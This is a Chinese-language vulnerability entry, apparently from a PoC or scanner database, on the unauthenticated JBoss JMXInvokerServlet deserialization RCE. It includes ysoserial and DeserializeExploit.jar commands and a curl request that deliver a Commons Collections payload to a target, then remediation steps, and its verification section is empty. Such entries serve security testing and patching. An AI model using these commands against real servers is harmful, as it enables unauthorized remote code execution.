---
id: JBOSS-JMXINVOKERSERVLET-DESERIALIZATION
title: JBoss JMXInvokerServlet 反序列化RCE漏洞
product: jboss
vendor: Red Hat
version_affected: "5.x, 6.x"
severity: CRITICAL
tags: [rce, deserialization, 无需认证]
fingerprint: ["JBoss", "AS", "JMX"]
---

## 漏洞描述

JBoss AS 5.x/6.x 中 /invoker/JMXInvokerServlet 接口读取用户传入的对象，结合 Apache Commons Collections 可执行任意代码。

## 影响版本

- JBoss AS 5.x
- JBoss AS 6.x

## 前置条件

- 无需认证
- 可访问 /invoker/JMXInvokerServlet 接口

## 利用步骤

1. 使用 ysoserial 或 DeserializeExploit 生成 payload
2. 发送 payload 到 /invoker/JMXInvokerServlet 接口

## Payload

```bash
# 使用 ysoserial 生成
java -jar ysoserial.jar CommonsCollections5 "touch /tmp/success" > poc.ser

# 发送
curl -X POST --data-binary @poc.ser "http://target:8080/invoker/JMXInvokerServlet"

# 或使用 DeserializeExploit.jar
java -jar DeserializeExploit.jar target:8080 CommonsCollections5 "id"
```

## 验证方法

```bash
# 检查命令执行结果
```

## 修复建议

1. 升级 JBoss AS 至最新版本
2. 升级 commons-collections 版本
3. 禁用 JMX Invoker Servlet
